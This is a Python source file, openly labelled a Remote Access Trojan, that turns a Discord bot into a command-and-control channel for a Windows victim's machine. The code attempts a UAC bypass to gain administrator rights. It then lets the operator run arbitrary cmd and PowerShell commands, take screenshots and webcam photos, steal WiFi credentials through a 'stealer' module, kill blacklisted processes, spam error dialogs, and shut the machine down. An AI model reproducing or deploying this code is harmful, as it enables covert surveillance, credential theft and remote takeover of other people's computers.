#-----------------------------------------------------------------------------------------------------------------------------------
# This is a RAT(Remote Access Trojaner)
# Author: Deltatoolbox aka TornLotus
# Contact: Discord: tornlotus
# Lizenz: MIT License
# Github: https://github.com/Deltatoolbox/not_learning_by_not_doing
#-----------------------------------------------------------------------------------------------------------------------------------
#normal imports
from interactions import slash_command, SlashContext
from interactions import OptionType, slash_option
from interactions import Client, Intents, listen
from interactions import ChannelType, File
import os
import threading
import json
import subprocess
#my imports
from modules import basic_functions as functions
from modules import stealer
#local settings
ctx = SlashContext
# Check if the file is in the final folder
config = functions.read_config()
functions.check_location(config["location"])
print(functions.uuid())
#discord set intents
bot = Client(intents=Intents.DEFAULT)
#-----------------------------------------------------------------------------------------------------------------------------------
# on ready
#-----------------------------------------------------------------------------------------------------------------------------------
print(f'is admin: {functions.IsAdmin()}')
if not(functions.IsAdmin()):
    functions.UACbypass(1)
    if not(functions.IsAdmin()):
        functions.UACbypass(2)
print(f'is admin: {functions.IsAdmin()}')
@listen()
async def on_ready():
    category_name = functions.category_name()
    guild = bot.get_guild(config["guild_id"])
    channels = await guild.fetch_channels()
    existing_categories = [channel for channel in channels if channel.type == ChannelType.GUILD_CATEGORY]

    category = next((c for c in existing_categories if c.name == category_name), None)
    if not category:
        category = await guild.create_category(category_name)

    if not os.path.exists('config_custom.json'):
        with open('config_custom.json', 'w') as config_file:
            json.dump({"category_id": category.id, "info_channel_id": None, "main_channel_id": None, "spam_channel_id": None}, config_file)

    config_custom = functions.get_ids()

    channel_ids = {"info_channel_id": "info", "main_channel_id": "main", "spam_channel_id": "spam"}
    for channel_id_key, channel_name in channel_ids.items():
        channel_id = config_custom.get(channel_id_key)
        if channel_id:  # Check if channel_id is not None or empty
            channel = guild.get_channel(channel_id)
        else:
            channel = None
        if not channel or (channel and channel.parent_id != category.id):
            channel = await category.create_text_channel(channel_name)
            config_custom[channel_id_key] = channel.id
        functions.save_ids(config_custom["category_id"], config_custom["info_channel_id"], config_custom["main_channel_id"], config_custom["spam_channel_id"])



#-----------------------------------------------------------------------------------------------------------------------------------
# slash commands
#-----------------------------------------------------------------------------------------------------------------------------------

#cmd command
@slash_command(
    name="cmd",
    description="execute a cmd command",
)
@slash_option(
    name="command",
    description="the command to execute",
    required=True,
    opt_type=OptionType.STRING,
)
async def cmd(ctx: SlashContext, command: str):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("cmd can only be executed in main.")
        return
    # execute cmd command (crash save with try)
    try:
        functions.exe_cmd(command)
        await ctx.send(file=File(f'{os.getcwd()}/output.txt'))
        os.remove(f'{os.getcwd()}/output.txt')
    except Exception as e:
        await ctx.send(f"error: {e}")
#shutdown command
@slash_command(
    name="shutdown",
    description="shutdown the pc",
)
async def shutdown(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("shutdown can only be executed in main.")
        return
    output = functions.shutdown()
    await ctx.send(output)
#restart command
@slash_command(
    name="restart",
    description="restart the pc",
)
async def restart(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("restart can only be executed in main.")
        return
    output = functions.restart()
    await ctx.send(output)
#powershell command
@slash_command(
    name="powershell",
    description="execute powershell command",
)
@slash_option(
    name="command",
    description="the command to execute",
    required=True,
    opt_type=OptionType.STRING,
)
async def powershell(ctx: SlashContext, command: str):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("powershell can only be executed in main.")
        return
    functions.powershell(command)
    await ctx.send(file=File(f'{os.getcwd()}/output.txt'))
    os.remove(f'{os.getcwd()}/output.txt')
#take sc
@slash_command(
    name="screenshot",
    description="make a screenshot",
)
async def screenshot(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("screenshot can only be executed in main.")
        return
    await functions.take_sc()
    # send sc
    await ctx.send(file=File(f'{os.getcwd()}/sc.png'))
    #remove sc
    os.remove(f'{os.getcwd()}/sc.png')
#blacklist
@slash_command(
    name="blacklist",
    description="blacklist programms",
)
@slash_option(
    name="add",
    description="True=add False=remove blacklist",
    required=True,
    opt_type=OptionType.BOOLEAN,
)
@slash_option(
    name="name",
    description="name off process",
    required=True,
    opt_type=OptionType.STRING,
)
async def blacklist(ctx: SlashContext, add: bool, name: str):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("blacklist can only be executed in main.")
        return
    if (add == True):
        output = functions.add_blacklist(name)
    else:
        output = functions.remove_blacklist(name)
    await ctx.send(output)
#webcam command
@slash_command(
    name="webcam",
    description="take webcam photo",
)
async def webcam(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("webcam can only be executed in main.")
        return
    output = 0
    output = functions.webcam()
    if not (output == 0):
        await ctx.send(output)
        return
    # send photo
    await ctx.send(file=File(f'{os.getcwd()}/web.png'))
    #remove photo
    os.remove(f'{os.getcwd()}/web.png')
#rickrolle command
@slash_command(
    name="rickrolle",
    description="start a rickrolle",
)
async def rickrolle(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("rickrolle can only be executed in main.")
        return
    output = functions.exe_cmd("start https://www.youtube.com/watch?v=xvFZjo5PgG0")
    await ctx.send(output)
#set volume on max
@slash_command(
    name="max_vol",
    description="set Volume on maximum",
)
async def max_vol(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("Max Volume can only be executed in main.")
        return
    functions.set_volume_max()
    await ctx.send("set Max Volume")
#min Volume
@slash_command(
    name="min_vol",
    description="set Volume on minimum",
)
async def min_vol(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("Min Volume can only be executed in main.")
        return
    functions.set_volume_min()
    await ctx.send("set Min Volume")
#error
@slash_command(
    name="error",
    description="send acostum error",
)
@slash_option(
    name="titel",
    description="Titel of the error",
    required=True,
    opt_type=OptionType.STRING,
)
@slash_option(
    name="message",
    description="error Message",
    required=True,
    opt_type=OptionType.STRING,
)
async def error(ctx: SlashContext, titel: str, message: str):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("error can only be executed in main.")
        return
    await ctx.send("sended the error")
    functions.error(titel, message)
#error spam
@slash_command(
    name="error_spam",
    description="spam errors, break the RAT connection",
)
@slash_option(
    name="titel",
    description="Titel of the error",
    required=True,
    opt_type=OptionType.STRING,
)
@slash_option(
    name="message",
    description="error Message",
    required=True,
    opt_type=OptionType.STRING,
)
async def error_spam(ctx: SlashContext, titel: str, message: str):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("error can only be executed in main.")
        return
    await ctx.send("sended the error")
    monitoring_thread = threading.Thread(target=functions.error_spam(titel, message))
    monitoring_thread.start()
#wifi info
@slash_command(
    name="wifi",
    description="give you wifi infos",
)
async def wifi(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("Min Volume can only be executed in main.")
        return
    stealer.scan_wifi()
    await ctx.send(file=File(f'{os.getcwd()}/output.txt'))
    os.remove(f'{os.getcwd()}/output.txt')
#get process
@slash_command(
    name="get_process",
    description="give you a list off all processes",
)
async def get_process(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("Min Volume can only be executed in main.")
        return
    functions.get_processes()
    await ctx.send(file=File(f'{os.getcwd()}/output.txt'))
    os.remove(f'{os.getcwd()}/output.txt')
#ip info
@slash_command(
    name="ip_info",
    description="get ip info",
)
async def ip_info(ctx: SlashContext):
    config_custom = functions.get_ids()
    channel = bot.get_channel(ctx.channel_id)
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("Min Volume can only be executed in main.")
        return
    stealer.ip_info()
    await ctx.send(file=File(f'{os.getcwd()}/output.txt'))
    os.remove(f'{os.getcwd()}/output.txt')
#-----------------------------------------------------------------------------------------------------------------------------------
# start everything
#-----------------------------------------------------------------------------------------------------------------------------------

# start blacklist thread
monitoring_thread = threading.Thread(target=functions.monitor_blacklisted_programs)
monitoring_thread.start()
#start bot
bot.start(config["token"])
